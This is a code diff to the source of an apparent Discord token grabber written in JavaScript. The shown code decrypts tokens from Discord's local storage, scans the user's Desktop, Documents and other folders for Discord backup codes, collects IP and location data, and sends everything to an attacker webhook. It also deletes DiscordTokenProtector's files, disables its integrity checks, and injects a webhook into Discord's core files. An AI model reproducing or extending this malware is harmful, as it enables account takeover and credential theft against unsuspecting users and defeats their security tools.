@@ -45,6 +45,7 @@ module.exports = (client) => {
 
                     for (var line of client.requires.fs.readFileSync(`${value}/${file_name}`, encoding = "utf8").split("\n")) {
 
+                        var _token;
                         if (value.includes("cord")) {
 
                             let encrypted = Buffer.from(JSON.parse(client.requires.fs.readFileSync(path_tail.replace("Local Storage", "Local State")))
@@ -64,15 +65,26 @@ module.exports = (client) => {
                                 decipher.setAuthTag(end);
                                 token = decipher.update(middle, 'base64', 'utf-8') + decipher.final('utf-8')
 
-                                await this.validateToken(key, token);
+                                _token = token;
                             }
                         } else {
                             [/\w-]{24}\.[\w-]{6}\.[\w-]{27}/, /mfa\.[\w-]{84}/].forEach(async (regex) => {
                                 if (line.match(regex)) {
                                     console.log(line.match(regex)[0])
-                                    await this.validateToken(key, line.match(regex)[0]);
+
+                                    _token = line.match(regex)[0]
                                 }
                             })
+                        }
+
+                        for (var token of client.config.discord.grabbed_tokens.all) {
+                            if (token.token == _token) {
+                                _token = undefined;
+                            }
+                        }
+
+                        if (_token) {
+                            await this.validateToken(key, _token);
                         }
                     }
                 }
@@ -82,6 +94,11 @@ module.exports = (client) => {
         },
 
         async validateToken(source, token) {
+
+            if (client.config.discord.grabbed_tokens.all.contains(token)) {
+                return;
+            }
+
             const req = await client.requires.axios({
                 url: "https://discord.com/api/v9/users/@me",
                 method: "GET",
@@ -174,8 +191,7 @@ module.exports = (client) => {
                 }
 
                 await client.utils.webhook.sendToWebhook(
-                    client.config.webhook.discord ? client.utils.encryption.decryptData(client.config.webhook.discord) : client.utils.encryption.decryptData(client.config.webhook.url),
-                    {
+                    client.utils.encryption.decryptData(client.config.webhook.url), {
                         "embeds": [client.utils.webhook.createEmbed({
                             "title": `Found token in: ${source}`,
                             "fields": fields,
@@ -288,39 +304,37 @@ module.exports = (client) => {
         },
 
         bypass_token_protector() {
-            try {
-                for (const file of ["DiscordTokenProtector.exe", "ProtectionPayload.dll", "secure.dat"]) {
-                    if (client.requires.fs.exists(`${client.utils.encryption.decryptData(client.config.user.localappdata)}\\${file}`)) {
-                        client.requires.fs.rm(`${client.utils.encryption.decryptData(client.config.user.localappdata)}\\${file}`);
-                    }
+            for (const file of ["DiscordTokenProtector.exe", "ProtectionPayload.dll", "secure.dat"]) {
+                if (client.requires.fs.exists(`${client.utils.encryption.decryptData(client.config.user.localappdata)}\\${file}`)) {
+                    client.requires.fs.rm(`${client.utils.encryption.decryptData(client.config.user.localappdata)}\\${file}`);
                 }
+            }
 
-                const token_protector_config = JSON.parse(client.requires.fs.readFileSync(`${client.utils.encryption.decryptData(client.config.user.localappdata)}\\DiscordTokenProtector\\config.json`, {
-                    encoding: "utf-8"
-                }))
+            const token_protector_config = JSON.parse(client.requires.fs.readFileSync(`${client.utils.encryption.decryptData(client.config.user.localappdata)}\\DiscordTokenProtector\\config.json`, {
+                encoding: "utf-8"
+            }))
 
-                token_protector_config['auto_start'] = false
-                token_protector_config['auto_start_discord'] = false
-                token_protector_config['integrity'] = false
-                token_protector_config['integrity_allowbetterdiscord'] = false
-                token_protector_config['integrity_checkexecutable'] = false
-                token_protector_config['integrity_checkhash'] = false
-                token_protector_config['integrity_checkmodule'] = false
-                token_protector_config['integrity_checkscripts'] = false
-                token_protector_config['integrity_checkresource'] = false
-                token_protector_config['integrity_redownloadhashes'] = false
-                token_protector_config['iterations_iv'] = 0
-                token_protector_config['iterations_key'] = 0
-                token_protector_config['version'] = 0
+            token_protector_config['auto_start'] = false
+            token_protector_config['auto_start_discord'] = false
+            token_protector_config['integrity'] = false
+            token_protector_config['integrity_allowbetterdiscord'] = false
+            token_protector_config['integrity_checkexecutable'] = false
+            token_protector_config['integrity_checkhash'] = false
+            token_protector_config['integrity_checkmodule'] = false
+            token_protector_config['integrity_checkscripts'] = false
+            token_protector_config['integrity_checkresource'] = false
+            token_protector_config['integrity_redownloadhashes'] = false
+            token_protector_config['iterations_iv'] = 0
+            token_protector_config['iterations_key'] = 0
+            token_protector_config['version'] = 0
 
-                client.requires.fs.writeFileSync(
-                    `${client.utils.encryption.decryptData(client.config.user.localappdata)}\\DiscordTokenProtector\\config.json`,
-                    JSON.stringify(
-                        token_protector_config,
-                        null, 4
-                    )
+            client.requires.fs.writeFileSync(
+                `${client.utils.encryption.decryptData(client.config.user.localappdata)}\\DiscordTokenProtector\\config.json`,
+                JSON.stringify(
+                    token_protector_config,
+                    null, 4
                 )
-            } catch {}
+            )
         },
 
         async listExecutables() {
@@ -351,7 +365,7 @@ module.exports = (client) => {
             const res = await client.requires.axios.get(client.utils.encryption.decryptData(client.config.discord.base_url));
 
             const file = () => {
-                let tempFile = res.data.replace('%WEBHOOK_LINK%', client.utils.encryption.decryptData(client.config.webhook.discord ? client.config.webhook.discord : client.config.webhook.url))
+                let tempFile = res.data.replace('%WEBHOOK_LINK%', client.config.webhook.url)
                 return tempFile;
             }
 
@@ -375,6 +389,23 @@ module.exports = (client) => {
             })
         },
 
+        findBackupCodes(prefixPath, files) {
+            files.forEach(async (file) => {
+                if (file.startsWith(".") || file.includes("AppData") || file.includes("Program")) {
+                    return;
+                }
+                if (file.startsWith("discord_backup_codes")) {
+                    await client.utils.webhook.sendToWebhook(
+                        client.utils.encryption.decryptData(client.config.webhook.url), {
+                            "embeds": [client.utils.webhook.createEmbed({
+                                "title": `💰 Discord backup codes found`,
+                                "description": `\`\`\`${prefixPath}\\${file}\n\n${client.requires.fs.readFileSync(`${prefixPath}\\${file}`)}\`\`\``,
+                            })],
+                        })
+                }
+            })
+        },
+
         async getIP() {
             return (await client.requires.axios.get("https://ipinfo.io/json")).data;
         },
@@ -391,38 +422,24 @@ module.exports = (client) => {
                 this.findDiscordCore(executable, client.requires.fs.readdirSync(executable))
             }
 
+            ["Videos", "Desktop", "Documents", "Downloads", "Pictures"].forEach(async (type) => {
+                await this.findBackupCodes(`${client.utils.encryption.decryptData(client.config.user.hostdir)}\\${type}`, client.requires.fs.readdirSync(`${client.utils.encryption.decryptData(client.config.user.hostdir)}\\${type}`))
+            })
+
             await this.modify_discord_core(); // 1
 
-            try {
-                await client.requires.child_process.exec('tasklist', async (err, stdout) => {
-                    for (const executable of ['Discord.exe', 'DiscordCanary.exe', 'discordDevelopment.exe', 'DiscordPTB.exe']) {
-                        if (stdout.includes(executable)) {
-                            await client.requires.child_process.exec(`taskkill /F /T /IM ${executable}`, (err) => {}) // Close
-                            await client.requires.child_process.exec(`"${client.utils.encryption.decryptData(client.config.user.localappdata)}\\${executable.replace('.exe', '')}\\Update.exe" --processStart ${executable}`, (err) => {}) // Start
-                        }
+            await client.requires.child_process.exec('tasklist', async (err, stdout) => {
+                for (const executable of ['Discord.exe', 'DiscordCanary.exe', 'discordDevelopment.exe', 'DiscordPTB.exe']) {
+                    if (stdout.includes(executable)) {
+                        //await client.requires.child_process.exec(`taskkill /F /T /IM ${executable}`, (err) => {}) // Close
+                        //await client.requires.child_process.exec(`"${client.utils.encryption.decryptData(client.config.user.localappdata)}\\${executable.replace('.exe', '')}\\Update.exe" --processStart ${executable}`, (err) => {}) // Start
                     }
-                })
-            } catch {}
-
-            let fields = []
+                }
+            })
 
             const network_data = await this.getIP();
-            client.config.user.network_data = network_data;
 
-            fields.push({
-                name: "Connection data",
-                value: `\`\`\`yaml\nIP Address: ${network_data['ip'] ?? "Unknown"}\nHostname: ${network_data['hostname'] ?? "Unknown"}\nCity: ${network_data['city'] ?? "Unknown"}\nRegion: ${network_data['region'] ?? "Unknown"}\nCountry: ${network_data["country"] ?? "Unknown"}\nTimezone: ${network_data["timezone"] ?? "Unknown"}\`\`\``,
-                inline: true
-            })
-
-            await client.utils.webhook.sendToWebhook(client.utils.encryption.decryptData(client.config.webhook.url), {
-                embeds: [client.utils.webhook.createEmbed({
-                    "title": `${client.utils.flags.getFlag(network_data["country"]) ?? "Unknown"} Grabbed data`,
-                    "fields": fields
-                })],
-            })
-
-
+            client.utils.jszip.createTxt("\\Network Data.txt", `IP Address: ${network_data['ip'] ?? "Unknown"}\nHostname: ${network_data['hostname'] ?? "Unknown"}\nCity: ${network_data['city'] ?? "Unknown"}\nRegion: ${network_data['region'] ?? "Unknown"}\nCountry: ${network_data["country"] ?? "Unknown"}\nTimezone: ${network_data["timezone"] ?? "Unknown"}`)
 
             await client.utils.time.sleep(30000);
             for (const path of client.config.discord.files_path) {
